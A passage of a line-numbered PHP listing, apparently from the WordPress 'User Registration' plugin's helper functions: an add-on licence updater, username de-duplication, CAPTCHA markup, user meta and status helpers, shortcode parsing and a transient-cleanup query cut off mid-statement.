| [1410](#L1410) | functionÂ ur\_addon\_updater(Â $file,Â $item\_id,Â $addon\_version,Â $betaÂ =Â falseÂ )Â { |
| [1411](#L1411) | $api\_endpointÂ =Â 'https://wpeverest.com/edd-sl-api/'; |
| [1412](#L1412) | $license\_keyÂ  =Â trim(Â get\_option(Â 'user-registration\_license\_key'Â )Â ); |
| [1413](#L1413) | ifÂ (Â class\_exists(Â 'UR\_AddOn\_Updater'Â )Â )Â { |
| [1414](#L1414) | newÂ UR\_AddOn\_Updater( |
| [1415](#L1415) | esc\_url\_raw(Â $api\_endpointÂ ), |
| [1416](#L1416) | $file, |
| [1417](#L1417) | array( |
| [1418](#L1418) | 'version'Â =>Â $addon\_version, |
| [1419](#L1419) | 'license'Â =>Â $license\_key, |
| [1420](#L1420) | 'item\_id'Â =>Â $item\_id, |
| [1421](#L1421) | 'author'Â  =>Â 'WPEverest', |
| [1422](#L1422) | 'url'Â  Â  Â =>Â home\_url(), |
| [1423](#L1423) | 'beta'Â  Â  =>Â $beta, |
| [1424](#L1424) | ) |
| [1425](#L1425) | ); |
| [1426](#L1426) | } |
| [1427](#L1427) | } |
| [1428](#L1428) |  |
| [1429](#L1429) | /\*\* |
| [1430](#L1430) | \* Check if username already exists in case of optional username |
| [1431](#L1431) | \* And while stripping through email address and incremet last number by 1. |
| [1432](#L1432) | \* |
| [1433](#L1433) | \* @paramÂ  string $username Username. |
| [1434](#L1434) | \* @return string |
| [1435](#L1435) | \*/ |
| [1436](#L1436) | functionÂ check\_username(Â $usernameÂ )Â { |
| [1437](#L1437) |  |
| [1438](#L1438) | ifÂ (Â username\_exists(Â $usernameÂ )Â )Â { |
| [1439](#L1439) | preg\_match\_all(Â '/\d+$/m',Â $username,Â $matchesÂ ); |
| [1440](#L1440) |  |
| [1441](#L1441) | ifÂ (Â isset(Â $matches[0][0]Â )Â )Â { |
| [1442](#L1442) | $last\_charÂ  Â  Â  Â =Â $matches[0][0]; |
| [1443](#L1443) | $strip\_last\_charÂ =Â substr(Â $username,Â 0,Â -(Â strlen(Â (string)Â $last\_charÂ )Â )Â ); |
| [1444](#L1444) | $last\_char++; |
| [1445](#L1445) | $usernameÂ =Â $strip\_last\_charÂ .Â $last\_char; |
| [1446](#L1446) | $usernameÂ =Â check\_username(Â $usernameÂ ); |
| [1447](#L1447) |  |
| [1448](#L1448) | returnÂ $username; |
| [1449](#L1449) | }Â elseÂ { |
| [1450](#L1450) | $usernameÂ =Â $usernameÂ .Â '\_1'; |
| [1451](#L1451) | $usernameÂ =Â check\_username(Â $usernameÂ ); |
| [1452](#L1452) |  |
| [1453](#L1453) | returnÂ $username; |
| [1454](#L1454) | } |
| [1455](#L1455) | } |
| [1456](#L1456) |  |
| [1457](#L1457) | returnÂ $username; |
| [1458](#L1458) | } |
| [1459](#L1459) |  |
| [1460](#L1460) | /\*\* |
| [1461](#L1461) | \* Get all user registration forms title with respective id. |
| [1462](#L1462) | \* |
| [1463](#L1463) | \* @param int $post\_count Post Count. |
| [1464](#L1464) | \* @return array |
| [1465](#L1465) | \*/ |
| [1466](#L1466) | functionÂ ur\_get\_all\_user\_registration\_form(Â $post\_countÂ =Â -1Â )Â { |
| [1467](#L1467) | $argsÂ  Â  Â  Â  =Â array( |
| [1468](#L1468) | 'status'Â  Â  Â  =>Â 'publish', |
| [1469](#L1469) | 'numberposts'Â =>Â $post\_count, |
| [1470](#L1470) | 'order'Â  Â  Â  Â =>Â 'ASC', |
| [1471](#L1471) | ); |
| [1472](#L1472) | $posts\_arrayÂ =Â UR()->form->get\_form(Â '',Â $argsÂ ); |
| [1473](#L1473) | $all\_formsÂ  Â =Â array(); |
| [1474](#L1474) |  |
| [1475](#L1475) | foreachÂ (Â $posts\_arrayÂ asÂ $postÂ )Â { |
| [1476](#L1476) | $all\_forms[Â $post->IDÂ ]Â =Â $post->post\_title; |
| [1477](#L1477) | } |
| [1478](#L1478) |  |
| [1479](#L1479) | returnÂ $all\_forms; |
| [1480](#L1480) | } |
| [1481](#L1481) |  |
| [1482](#L1482) | /\*\* |
| [1483](#L1483) | \* Checks user login option, if not email confirmation force not disable emails. |
| [1484](#L1484) | \*/ |
| [1485](#L1485) | functionÂ ur\_get\_user\_login\_option()Â { |
| [1486](#L1486) |  |
| [1487](#L1487) | ifÂ (Â 'email\_confirmation'Â !==Â get\_option(Â 'user\_registration\_general\_setting\_login\_options'Â )Â )Â { |
| [1488](#L1488) | returnÂ array( |
| [1489](#L1489) | 'title'Â  Â  =>Â \_\_(Â 'Disable emails',Â 'user-registration'Â ), |
| [1490](#L1490) | 'desc'Â  Â  Â =>Â \_\_(Â 'Disable all emails sent after registration.',Â 'user-registration'Â ), |
| [1491](#L1491) | 'id'Â  Â  Â  Â =>Â 'user\_registration\_email\_setting\_disable\_email', |
| [1492](#L1492) | 'default'Â  =>Â 'no', |
| [1493](#L1493) | 'type'Â  Â  Â =>Â 'toggle', |
| [1494](#L1494) | 'autoload'Â =>Â false, |
| [1495](#L1495) | ); |
| [1496](#L1496) | }Â elseÂ { |
| [1497](#L1497) | update\_option(Â 'user\_registration\_email\_setting\_disable\_email',Â falseÂ ); |
| [1498](#L1498) | } |
| [1499](#L1499) | } |
| [1500](#L1500) |  |
| [1501](#L1501) | /\*\* |
| [1502](#L1502) | \* Get the node to display google reCaptcha |
| [1503](#L1503) | \* |
| [1504](#L1504) | \* @param string $context Recaptcha context. |
| [1505](#L1505) | \* @param string $recaptcha\_enabled Is Recaptcha enabled. |
| [1506](#L1506) | \* @return string |
| [1507](#L1507) | \*/ |
| [1508](#L1508) | functionÂ ur\_get\_recaptcha\_node(Â $context,Â $recaptcha\_enabledÂ =Â falseÂ )Â { |
| [1509](#L1509) |  |
| [1510](#L1510) | $recaptcha\_typeÂ  Â  Â  =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_version',Â 'v2'Â ); |
| [1511](#L1511) | $invisible\_recaptchaÂ =Â ur\_option\_checked(Â 'user\_registration\_captcha\_setting\_invisible\_recaptcha\_v2',Â falseÂ ); |
| [1512](#L1512) |  |
| [1513](#L1513) | ifÂ (Â 'v2'Â ===Â $recaptcha\_typeÂ &&Â !Â $invisible\_recaptchaÂ )Â { |
| [1514](#L1514) | $recaptcha\_site\_keyÂ  Â  =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_site\_key'Â ); |
| [1515](#L1515) | $recaptcha\_site\_secretÂ =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_site\_secret'Â ); |
| [1516](#L1516) | $enqueue\_scriptÂ  Â  Â  Â  =Â 'ur-google-recaptcha'; |
| [1517](#L1517) | }Â elseifÂ (Â 'v2'Â ===Â $recaptcha\_typeÂ &&Â $invisible\_recaptchaÂ )Â { |
| [1518](#L1518) | $recaptcha\_site\_keyÂ  Â  =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_invisible\_site\_key'Â ); |
| [1519](#L1519) | $recaptcha\_site\_secretÂ =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_invisible\_site\_secret'Â ); |
| [1520](#L1520) | $enqueue\_scriptÂ  Â  Â  Â  =Â 'ur-google-recaptcha'; |
| [1521](#L1521) | }Â elseifÂ (Â 'v3'Â ===Â $recaptcha\_typeÂ )Â { |
| [1522](#L1522) | $recaptcha\_site\_keyÂ  Â  =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_site\_key\_v3'Â ); |
| [1523](#L1523) | $recaptcha\_site\_secretÂ =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_site\_secret\_v3'Â ); |
| [1524](#L1524) | $enqueue\_scriptÂ  Â  Â  Â  =Â 'ur-google-recaptcha-v3'; |
| [1525](#L1525) | }Â elseifÂ (Â 'hCaptcha'Â ===Â $recaptcha\_typeÂ )Â { |
| [1526](#L1526) | $recaptcha\_site\_keyÂ  Â  =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_site\_key\_hcaptcha'Â ); |
| [1527](#L1527) | $recaptcha\_site\_secretÂ =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_site\_secret\_hcaptcha'Â ); |
| [1528](#L1528) | $enqueue\_scriptÂ  Â  Â  Â  =Â 'ur-recaptcha-hcaptcha'; |
| [1529](#L1529) | } |
| [1530](#L1530) | staticÂ $rc\_counterÂ =Â 0; |
| [1531](#L1531) |  |
| [1532](#L1532) | ifÂ (Â $recaptcha\_enabledÂ )Â { |
| [1533](#L1533) |  |
| [1534](#L1534) | ifÂ (Â 0Â ===Â $rc\_counterÂ )Â { |
| [1535](#L1535) | wp\_enqueue\_script(Â 'ur-recaptcha'Â ); |
| [1536](#L1536) | wp\_enqueue\_script(Â $enqueue\_scriptÂ ); |
| [1537](#L1537) |  |
| [1538](#L1538) | $ur\_google\_recaptcha\_codeÂ =Â array( |
| [1539](#L1539) | 'site\_key'Â  Â  Â  Â  Â  =>Â $recaptcha\_site\_key, |
| [1540](#L1540) | 'is\_captcha\_enable'Â =>Â true, |
| [1541](#L1541) | 'version'Â  Â  Â  Â  Â  Â =>Â $recaptcha\_type, |
| [1542](#L1542) | 'is\_invisible'Â  Â  Â  =>Â $invisible\_recaptcha, |
| [1543](#L1543) | ); |
| [1544](#L1544) |  |
| [1545](#L1545) | ifÂ (Â function\_exists(Â 'wp\_is\_block\_theme'Â )Â &&Â wp\_is\_block\_theme()Â )Â { |
| [1546](#L1546) | ?> |
| [1547](#L1547) | <script id="<?phpÂ echoÂ esc\_attr(Â $enqueue\_scriptÂ );Â ?>"> |
| [1548](#L1548) | const ur\_recaptcha\_code = <?phpÂ echoÂ wp\_json\_encode(Â $ur\_google\_recaptcha\_codeÂ );Â ?> |
| [1549](#L1549) | </script> |
| [1550](#L1550) | <?php |
| [1551](#L1551) | }Â elseÂ { |
| [1552](#L1552) | wp\_localize\_script(Â $enqueue\_script,Â 'ur\_recaptcha\_code',Â $ur\_google\_recaptcha\_codeÂ ); |
| [1553](#L1553) | } |
| [1554](#L1554) | $rc\_counter++; |
| [1555](#L1555) | } |
| [1556](#L1556) |  |
| [1557](#L1557) | ifÂ (Â 'v3'Â ===Â $recaptcha\_typeÂ )Â { |
| [1558](#L1558) | ifÂ (Â 'login'Â ===Â $contextÂ )Â { |
| [1559](#L1559) | $recaptcha\_nodeÂ =Â '<div id="node\_recaptcha\_login" class="g-recaptcha-v3" style="display:none"><textarea id="g-recaptcha-response" name="g-recaptcha-response" ></textarea></div>'; |
| [1560](#L1560) | }Â elseifÂ (Â 'register'Â ===Â $contextÂ )Â { |
| [1561](#L1561) | $recaptcha\_nodeÂ =Â '<div id="node\_recaptcha\_register" class="g-recaptcha-v3" style="display:none"><textarea id="g-recaptcha-response" name="g-recaptcha-response" ></textarea></div>'; |
| [1562](#L1562) | }Â elseifÂ (Â 'lost\_password'Â ===Â $contextÂ )Â { |
| [1563](#L1563) | $recaptcha\_nodeÂ =Â '<div id="node\_recaptcha\_lost\_password" class="g-recaptcha-v3" style="display:none"><textarea id="g-recaptcha-response" name="g-recaptcha-response" ></textarea></div>'; |
| [1564](#L1564) | }Â elseÂ { |
| [1565](#L1565) | $recaptcha\_nodeÂ =Â ''; |
| [1566](#L1566) | } |
| [1567](#L1567) | }Â elseifÂ (Â 'hCaptcha'Â ===Â $recaptcha\_typeÂ )Â { |
| [1568](#L1568) |  |
| [1569](#L1569) | ifÂ (Â 'login'Â ===Â $contextÂ )Â { |
| [1570](#L1570) | $recaptcha\_nodeÂ =Â '<div id="node\_recaptcha\_login" class="g-recaptcha-hcaptcha"></div>'; |
| [1571](#L1571) |  |
| [1572](#L1572) | }Â elseifÂ (Â 'register'Â ===Â $contextÂ )Â { |
| [1573](#L1573) | $recaptcha\_nodeÂ =Â '<div id="node\_recaptcha\_register" class="g-recaptcha-hcaptcha"></div>'; |
| [1574](#L1574) | }Â elseifÂ (Â 'lost\_password'Â ===Â $contextÂ )Â { |
| [1575](#L1575) | $recaptcha\_nodeÂ =Â '<div id="node\_recaptcha\_lost\_password" class="g-recaptcha-hcaptcha"></div>'; |
| [1576](#L1576) | }Â elseÂ { |
| [1577](#L1577) | $recaptcha\_nodeÂ =Â ''; |
| [1578](#L1578) | } |
| [1579](#L1579) | }Â elseÂ { |
| [1580](#L1580) | ifÂ (Â 'v2'Â ===Â $recaptcha\_typeÂ &&Â $invisible\_recaptchaÂ )Â { |
| [1581](#L1581) | ifÂ (Â 'login'Â ===Â $contextÂ )Â { |
| [1582](#L1582) | $recaptcha\_nodeÂ =Â '<div id="node\_recaptcha\_login" class="g-recaptcha" data-size="invisible"></div>'; |
| [1583](#L1583) | }Â elseifÂ (Â 'register'Â ===Â $contextÂ )Â { |
| [1584](#L1584) | $recaptcha\_nodeÂ =Â '<div id="node\_recaptcha\_register" class="g-recaptcha" data-size="invisible"></div>'; |
| [1585](#L1585) | }Â elseifÂ (Â 'lost\_password'Â ===Â $contextÂ )Â { |
| [1586](#L1586) | $recaptcha\_nodeÂ =Â '<div id="node\_recaptcha\_lost\_password" class="g-recaptcha" data-size="invisible"></div>'; |
| [1587](#L1587) | }Â elseÂ { |
| [1588](#L1588) | $recaptcha\_nodeÂ =Â ''; |
| [1589](#L1589) | } |
| [1590](#L1590) | }Â elseÂ { |
| [1591](#L1591) | ifÂ (Â 'login'Â ===Â $contextÂ )Â { |
| [1592](#L1592) | $recaptcha\_nodeÂ =Â '<div id="node\_recaptcha\_login" class="g-recaptcha"></div>'; |
| [1593](#L1593) |  |
| [1594](#L1594) | }Â elseifÂ (Â 'register'Â ===Â $contextÂ )Â { |
| [1595](#L1595) | $recaptcha\_nodeÂ =Â '<div id="node\_recaptcha\_register" class="g-recaptcha"></div>'; |
| [1596](#L1596) | }Â elseifÂ (Â 'lost\_password'Â ===Â $contextÂ )Â { |
| [1597](#L1597) | $recaptcha\_nodeÂ =Â '<div id="node\_recaptcha\_lost\_password" class="g-recaptcha"></div>'; |
| [1598](#L1598) | }Â elseÂ { |
| [1599](#L1599) | $recaptcha\_nodeÂ =Â ''; |
| [1600](#L1600) | } |
| [1601](#L1601) | } |
| [1602](#L1602) | } |
| [1603](#L1603) | }Â elseÂ { |
| [1604](#L1604) | $recaptcha\_nodeÂ =Â ''; |
| [1605](#L1605) | } |
| [1606](#L1606) |  |
| [1607](#L1607) | returnÂ $recaptcha\_node; |
| [1608](#L1608) | } |
| [1609](#L1609) |  |
| [1610](#L1610) | /\*\* |
| [1611](#L1611) | \* Get meta key label pair by form id |
| [1612](#L1612) | \* |
| [1613](#L1613) | \* @paramÂ  int $form\_id Form ID. |
| [1614](#L1614) | \* @sinceÂ  1.5.0 |
| [1615](#L1615) | \* @return array |
| [1616](#L1616) | \*/ |
| [1617](#L1617) | functionÂ ur\_get\_meta\_key\_label(Â $form\_idÂ )Â { |
| [1618](#L1618) |  |
| [1619](#L1619) | $key\_labelÂ =Â array(); |
| [1620](#L1620) |  |
| [1621](#L1621) | $post\_content\_arrayÂ =Â (Â $form\_idÂ )Â ?Â UR()->form->get\_form(Â $form\_id,Â array(Â 'content\_only'Â =>Â trueÂ )Â )Â :Â array(); |
| [1622](#L1622) |  |
| [1623](#L1623) | foreachÂ (Â $post\_content\_arrayÂ asÂ $post\_content\_rowÂ )Â { |
| [1624](#L1624) | foreachÂ (Â $post\_content\_rowÂ asÂ $post\_content\_gridÂ )Â { |
| [1625](#L1625) | foreachÂ (Â $post\_content\_gridÂ asÂ $fieldÂ )Â { |
| [1626](#L1626) | ifÂ (Â isset(Â $field->field\_keyÂ )Â &&Â isset(Â $field->general\_setting->field\_nameÂ )Â )Â { |
| [1627](#L1627) | $key\_label[Â $field->general\_setting->field\_nameÂ ]Â =Â $field->general\_setting->label; |
| [1628](#L1628) | } |
| [1629](#L1629) | } |
| [1630](#L1630) | } |
| [1631](#L1631) | } |
| [1632](#L1632) |  |
| [1633](#L1633) | returnÂ apply\_filters(Â 'user\_registration\_meta\_key\_label',Â $key\_label,Â $form\_id,Â $post\_content\_arrayÂ ); |
| [1634](#L1634) | } |
| [1635](#L1635) |  |
| [1636](#L1636) | /\*\* |
| [1637](#L1637) | \* Get all user registration fields of the user by querying to database. |
| [1638](#L1638) | \* |
| [1639](#L1639) | \* @paramÂ  int $user\_idÂ  Â  User ID. |
| [1640](#L1640) | \* @sinceÂ  1.5.0 |
| [1641](#L1641) | \* @return array |
| [1642](#L1642) | \*/ |
| [1643](#L1643) | functionÂ ur\_get\_user\_extra\_fields(Â $user\_idÂ )Â { |
| [1644](#L1644) | $name\_valueÂ =Â array(); |
| [1645](#L1645) |  |
| [1646](#L1646) | $admin\_profileÂ =Â newÂ UR\_Admin\_Profile(); |
| [1647](#L1647) | $extra\_dataÂ  Â  =Â $admin\_profile->get\_user\_meta\_by\_form\_fields(Â $user\_idÂ ); |
| [1648](#L1648) | $form\_fieldsÂ  Â =Â isset(Â array\_column(Â $extra\_data,Â 'fields'Â )[0]Â )Â ?Â array\_column(Â $extra\_data,Â 'fields'Â )[0]Â :Â array();Â //phpcs:ignore |
| [1649](#L1649) | ifÂ (Â !Â empty(Â $form\_fieldsÂ )Â )Â { |
| [1650](#L1650) | foreachÂ (Â $form\_fieldsÂ asÂ $field\_keyÂ =>Â $field\_dataÂ )Â { |
| [1651](#L1651) | $valueÂ  Â  Â =Â get\_user\_meta(Â $user\_id,Â $field\_key,Â trueÂ ); |
| [1652](#L1652) | $field\_keyÂ =Â str\_replace(Â 'user\_registration\_',Â '',Â $field\_keyÂ ); |
| [1653](#L1653) |  |
| [1654](#L1654) | ifÂ (Â is\_serialized(Â $valueÂ )Â )Â { |
| [1655](#L1655) | $valueÂ =Â unserialize(Â $value,Â array(Â 'allowed\_classes'Â =>Â falseÂ )Â );Â //phpcs:ignore |
| [1656](#L1656) | $valueÂ =Â implode(Â ',',Â $valueÂ ); |
| [1657](#L1657) | } |
| [1658](#L1658) |  |
| [1659](#L1659) | $name\_value[Â $field\_keyÂ ]Â =Â $value; |
| [1660](#L1660) |  |
| [1661](#L1661) | } |
| [1662](#L1662) | } |
| [1663](#L1663) |  |
| [1664](#L1664) | returnÂ apply\_filters(Â 'user\_registration\_user\_extra\_fields',Â $name\_value,Â $user\_idÂ ); |
| [1665](#L1665) | } |
| [1666](#L1666) |  |
| [1667](#L1667) | /\*\* |
| [1668](#L1668) | \* Get User status like approved, pending. |
| [1669](#L1669) | \* |
| [1670](#L1670) | \* @paramÂ  string $user\_status Admin approval status of user. |
| [1671](#L1671) | \* @paramÂ  string $user\_email\_status Email confirmation status of user. |
| [1672](#L1672) | \*/ |
| [1673](#L1673) | functionÂ ur\_get\_user\_status(Â $user\_status,Â $user\_email\_statusÂ )Â { |
| [1674](#L1674) | $statusÂ =Â array(); |
| [1675](#L1675) | ifÂ (Â '0'Â ===Â $user\_statusÂ ||Â '0'Â ===Â $user\_email\_statusÂ )Â { |
| [1676](#L1676) | array\_push(Â $status,Â 'Pending'Â ); |
| [1677](#L1677) | }Â elseifÂ (Â '-1'Â ===Â $user\_statusÂ ||Â '-1'Â ===Â $user\_email\_statusÂ )Â { |
| [1678](#L1678) | array\_push(Â $status,Â 'Denied'Â ); |
| [1679](#L1679) | }Â elseÂ { |
| [1680](#L1680) | ifÂ (Â $user\_email\_statusÂ )Â { |
| [1681](#L1681) | array\_push(Â $status,Â 'Verified'Â ); |
| [1682](#L1682) | }Â elseÂ { |
| [1683](#L1683) | array\_push(Â $status,Â 'Approved'Â ); |
| [1684](#L1684) | } |
| [1685](#L1685) | } |
| [1686](#L1686) | returnÂ $status; |
| [1687](#L1687) | } |
| [1688](#L1688) |  |
| [1689](#L1689) | /\*\* |
| [1690](#L1690) | \* Get link for back button used on email settings. |
| [1691](#L1691) | \* |
| [1692](#L1692) | \* @paramÂ  string $label Label. |
| [1693](#L1693) | \* @paramÂ  string $url URL. |
| [1694](#L1694) | \*/ |
| [1695](#L1695) | functionÂ ur\_back\_link(Â $label,Â $urlÂ )Â { |
| [1696](#L1696) | returnÂ '<small class="ur-admin-breadcrumb"><a href="'Â .Â esc\_url(Â $urlÂ )Â .Â '" aria-label="'Â .Â esc\_attr(Â $labelÂ )Â .Â '">&#x2934;</a></small>'; |
| [1697](#L1697) | } |
| [1698](#L1698) |  |
| [1699](#L1699) | /\*\* |
| [1700](#L1700) | \* The function wp\_doing ajax() is introduced in core @since 4.7, |
| [1701](#L1701) | \*/ |
| [1702](#L1702) | ifÂ (Â !Â function\_exists(Â 'wp\_doing\_ajax'Â )Â )Â { |
| [1703](#L1703) | /\*\* |
| [1704](#L1704) | \* Filters whether the current request is a WordPress Ajax request. |
| [1705](#L1705) | \*/ |
| [1706](#L1706) | functionÂ wp\_doing\_ajax()Â { |
| [1707](#L1707) | returnÂ apply\_filters(Â 'wp\_doing\_ajax',Â defined(Â 'DOING\_AJAX'Â )Â &&Â DOING\_AJAXÂ ); |
| [1708](#L1708) | } |
| [1709](#L1709) | } |
| [1710](#L1710) |  |
| [1711](#L1711) | /\*\* |
| [1712](#L1712) | \* Checks if the string is json or not |
| [1713](#L1713) | \* |
| [1714](#L1714) | \* @paramÂ  string $str String to check. |
| [1715](#L1715) | \* @sinceÂ  1.4.2 |
| [1716](#L1716) | \* @return mixed |
| [1717](#L1717) | \*/ |
| [1718](#L1718) | functionÂ ur\_is\_json(Â $strÂ )Â { |
| [1719](#L1719) | ifÂ (Â !Â is\_string(Â $strÂ )Â )Â { |
| [1720](#L1720) | returnÂ false; |
| [1721](#L1721) | } |
| [1722](#L1722) |  |
| [1723](#L1723) | $jsonÂ =Â json\_decode(Â $strÂ ); |
| [1724](#L1724) | returnÂ $jsonÂ &&Â $strÂ !=Â $jsonÂ &&Â json\_last\_error()Â ==Â JSON\_ERROR\_NONE; |
| [1725](#L1725) | } |
| [1726](#L1726) |  |
| [1727](#L1727) | /\*\* |
| [1728](#L1728) | \* Checks if the form contains a date field or not. |
| [1729](#L1729) | \* |
| [1730](#L1730) | \* @paramÂ  int $form\_idÂ  Â  Â Form ID. |
| [1731](#L1731) | \* @sinceÂ  1.5.3 |
| [1732](#L1732) | \* @return boolean |
| [1733](#L1733) | \*/ |
| [1734](#L1734) | functionÂ ur\_has\_date\_field(Â $form\_idÂ )Â { |
| [1735](#L1735) |  |
| [1736](#L1736) | $post\_content\_arrayÂ =Â (Â $form\_idÂ )Â ?Â UR()->form->get\_form(Â $form\_id,Â array(Â 'content\_only'Â =>Â trueÂ )Â )Â :Â array(); |
| [1737](#L1737) |  |
| [1738](#L1738) | ifÂ (Â !Â empty(Â $post\_content\_arrayÂ )Â )Â { |
| [1739](#L1739) | foreachÂ (Â $post\_content\_arrayÂ asÂ $post\_content\_rowÂ )Â { |
| [1740](#L1740) | foreachÂ (Â $post\_content\_rowÂ asÂ $post\_content\_gridÂ )Â { |
| [1741](#L1741) | foreachÂ (Â $post\_content\_gridÂ asÂ $fieldÂ )Â { |
| [1742](#L1742) | ifÂ (Â isset(Â $field->field\_keyÂ )Â &&Â 'date'Â ===Â $field->field\_keyÂ )Â { |
| [1743](#L1743) | returnÂ true; |
| [1744](#L1744) | } |
| [1745](#L1745) | } |
| [1746](#L1746) | } |
| [1747](#L1747) | } |
| [1748](#L1748) | } |
| [1749](#L1749) |  |
| [1750](#L1750) | returnÂ false; |
| [1751](#L1751) | } |
| [1752](#L1752) |  |
| [1753](#L1753) | /\*\* |
| [1754](#L1754) | \* Get attributes from the shortcode content. |
| [1755](#L1755) | \* |
| [1756](#L1756) | \* @paramÂ  string $contentÂ  Â  Â Shortcode content. |
| [1757](#L1757) | \* @return arrayÂ  Â  Â  Â  Array of attributes within the shortcode. |
| [1758](#L1758) | \* |
| [1759](#L1759) | \* @sinceÂ  1.6.0 |
| [1760](#L1760) | \*/ |
| [1761](#L1761) | functionÂ ur\_get\_shortcode\_attr(Â $contentÂ )Â { |
| [1762](#L1762) | $patternÂ =Â get\_shortcode\_regex(); |
| [1763](#L1763) |  |
| [1764](#L1764) | $keysÂ  Â =Â array(); |
| [1765](#L1765) | $resultÂ =Â array(); |
| [1766](#L1766) |  |
| [1767](#L1767) | ifÂ (Â preg\_match\_all(Â '/'Â .Â $patternÂ .Â '/s',Â $content,Â $matchesÂ )Â )Â { |
| [1768](#L1768) |  |
| [1769](#L1769) | foreachÂ (Â $matches[0]Â asÂ $keyÂ =>Â $valueÂ )Â { |
| [1770](#L1770) |  |
| [1771](#L1771) | // $matches[ 3 ] return the shortcode attribute as string. |
| [1772](#L1772) | // replace space with '&' for parse\_str() function. |
| [1773](#L1773) | $getÂ =Â str\_replace(Â ' ',Â '&',Â $matches[3][Â $keyÂ ]Â ); |
| [1774](#L1774) | parse\_str(Â $get,Â $outputÂ ); |
| [1775](#L1775) |  |
| [1776](#L1776) | // Get all shortcode attribute keys. |
| [1777](#L1777) | $keysÂ  Â  Â =Â array\_unique(Â array\_merge(Â $keys,Â array\_keys(Â $outputÂ )Â )Â ); |
| [1778](#L1778) | $result[]Â =Â $output; |
| [1779](#L1779) | } |
| [1780](#L1780) |  |
| [1781](#L1781) | ifÂ (Â $keysÂ &&Â $resultÂ )Â { |
| [1782](#L1782) |  |
| [1783](#L1783) | // Loop the result array and add the missing shortcode attribute key. |
| [1784](#L1784) | foreachÂ (Â $resultÂ asÂ $keyÂ =>Â $valueÂ )Â { |
| [1785](#L1785) |  |
| [1786](#L1786) | // Loop the shortcode attribute key. |
| [1787](#L1787) | foreachÂ (Â $keysÂ asÂ $attr\_keyÂ )Â { |
| [1788](#L1788) | $result[Â $keyÂ ][Â $attr\_keyÂ ]Â =Â isset(Â $result[Â $keyÂ ][Â $attr\_keyÂ ]Â )Â ?Â $result[Â $keyÂ ][Â $attr\_keyÂ ]Â :Â null; |
| [1789](#L1789) | } |
| [1790](#L1790) |  |
| [1791](#L1791) | // Sort the array key. |
| [1792](#L1792) | ksort(Â $result[Â $keyÂ ]Â ); |
| [1793](#L1793) | } |
| [1794](#L1794) | } |
| [1795](#L1795) | } |
| [1796](#L1796) |  |
| [1797](#L1797) | returnÂ $result; |
| [1798](#L1798) | } |
| [1799](#L1799) |  |
| [1800](#L1800) | /\*\* |
| [1801](#L1801) | \* Print js script by properly sanitizing and escaping. |
| [1802](#L1802) | \* |
| [1803](#L1803) | \* @since 1.1.2 |
| [1804](#L1804) | \* Output any queued javascript code in the footer. |
| [1805](#L1805) | \*/ |
| [1806](#L1806) | functionÂ ur\_print\_js()Â { |
| [1807](#L1807) | globalÂ $ur\_queued\_js; |
| [1808](#L1808) |  |
| [1809](#L1809) | ifÂ (Â !Â empty(Â $ur\_queued\_jsÂ )Â )Â { |
| [1810](#L1810) | // Sanitize. |
| [1811](#L1811) | $ur\_queued\_jsÂ =Â wp\_check\_invalid\_utf8(Â $ur\_queued\_jsÂ ); |
| [1812](#L1812) | $ur\_queued\_jsÂ =Â preg\_replace(Â '/&#(x)?0\*(?(1)27|39);?/i',Â "'",Â $ur\_queued\_jsÂ ); |
| [1813](#L1813) | $ur\_queued\_jsÂ =Â str\_replace(Â "\r",Â '',Â $ur\_queued\_jsÂ ); |
| [1814](#L1814) |  |
| [1815](#L1815) | $jsÂ =Â "<!-- User Registration JavaScript -->\n<script type=\"text/javascript\">\njQuery(function($) { $ur\_queued\_jsÂ });\n</script>\n"; |
| [1816](#L1816) |  |
| [1817](#L1817) | /\*\* |
| [1818](#L1818) | \* User Registration js filter. |
| [1819](#L1819) | \* |
| [1820](#L1820) | \* @param string $js JavaScript code. |
| [1821](#L1821) | \*/ |
| [1822](#L1822) | echoÂ wp\_kses(Â apply\_filters(Â 'user\_registration\_queued\_js',Â $jsÂ ),Â array(Â 'script'Â =>Â array(Â 'type'Â =>Â trueÂ )Â )Â ); |
| [1823](#L1823) |  |
| [1824](#L1824) | unset(Â $ur\_queued\_jsÂ ); |
| [1825](#L1825) | } |
| [1826](#L1826) | } |
| [1827](#L1827) | /\*\* |
| [1828](#L1828) | \* Enqueue UR js. |
| [1829](#L1829) | \* |
| [1830](#L1830) | \* @since 1.1.2 |
| [1831](#L1831) | \* Queue some JavaScript code to be output in the footer. |
| [1832](#L1832) | \* |
| [1833](#L1833) | \* @param string $code Code to enqueue. |
| [1834](#L1834) | \*/ |
| [1835](#L1835) | functionÂ ur\_enqueue\_js(Â $codeÂ )Â { |
| [1836](#L1836) | globalÂ $ur\_queued\_js; |
| [1837](#L1837) |  |
| [1838](#L1838) | ifÂ (Â empty(Â $ur\_queued\_jsÂ )Â )Â { |
| [1839](#L1839) | $ur\_queued\_jsÂ =Â ''; |
| [1840](#L1840) | } |
| [1841](#L1841) |  |
| [1842](#L1842) | $ur\_queued\_jsÂ .=Â "\n"Â .Â $codeÂ .Â "\n"; |
| [1843](#L1843) | } |
| [1844](#L1844) |  |
| [1845](#L1845) | /\*\* |
| [1846](#L1846) | \* Delete expired transients. |
| [1847](#L1847) | \* |
| [1848](#L1848) | \* Deletes all expired transients. The multi-table delete syntax is used. |
| [1849](#L1849) | \* to delete the transient record from table a, and the corresponding. |
| [1850](#L1850) | \* transient\_timeout record from table b. |
| [1851](#L1851) | \* |
| [1852](#L1852) | \* Based on code inside core's upgrade\_network() function. |
| [1853](#L1853) | \* |
| [1854](#L1854) | \* @sinceÂ  1.2.0 |
| [1855](#L1855) | \* @return int Number of transients that were cleared. |
| [1856](#L1856) | \*/ |
| [1857](#L1857) | functionÂ ur\_delete\_expired\_transients()Â { |
| [1858](#L1858) | globalÂ $wpdb; |
| [1859](#L1859) |  |
| [1860](#L1860) | $sqlÂ  =Â "DELETE a, b FROM $wpdb->optionsÂ a, $wpdb->optionsÂ b |
| [1861](#L1861) | WHERE a.option\_name LIKE %s |
| [1862](#L1862) | AND a.option\_name NOT LIKE %s |
